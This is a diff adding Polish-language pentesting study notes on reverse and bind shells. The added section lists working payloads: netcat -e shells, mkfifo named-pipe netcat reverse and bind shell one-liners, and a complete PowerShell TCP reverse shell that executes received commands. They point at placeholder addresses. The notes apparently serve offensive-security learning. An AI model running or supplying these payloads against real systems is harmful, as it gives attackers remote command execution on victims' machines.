@@ -14,3 +14,20 @@ Najszęstsze shelle to:
 Są 2 rodzaje:
 - reverse shell - zmuszenie atakowanego komputera do połączenia się z naszym, dobre żeby ominąć firewall ale problemem może być ustawienie połączenia przez internet.
 - bind shell - ustawienie nasłuchiwania na atakowanym komputerze żeby można było się z nim połączyć. Problemem może być firewall, nie ma problemu z konfigurowaniem połączenia przez internet.
+
+# Popularne payloady
+
+W wersji netcat na windowsa i wersji na kali istnieje argument `-e` który pozwoli wykonać process na połączeniu, np. listener `nc -lvnp <PORT> -e /bin/bash` wykonona bind shell na celu a reverse shell `nc <LOCAL-IP> <PORT> -e /bin/bash` reverse shell.
+Większość wersji netcat nie posiada jednak tej opcji z racji na to że jest to niebezpieczne. Windows niemal zawsze to ma ale linux niekoniecznie. 
+Na linux raczej ten bind shell się robi `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+Polecenie tworzy "named pipe" w `/tmp/f`. Dalej tworzy netcat listener do wyjścia tego named pipe. Następnie output z listenera idzie bezpośrednio do `sh` wysyłając stderr output stream into stdout, and sending stdout itself into the input of the named pipe
+
+Podobnie można reverse shell `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+
+## Na Windows Server
+
+Na windows server często wymagany jest powershell reverse shell i to jest one-liner który to robi:
+```
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+To trzeba do cmd albo jakiegoś webshell i po wykonaniu jest reverse shell.
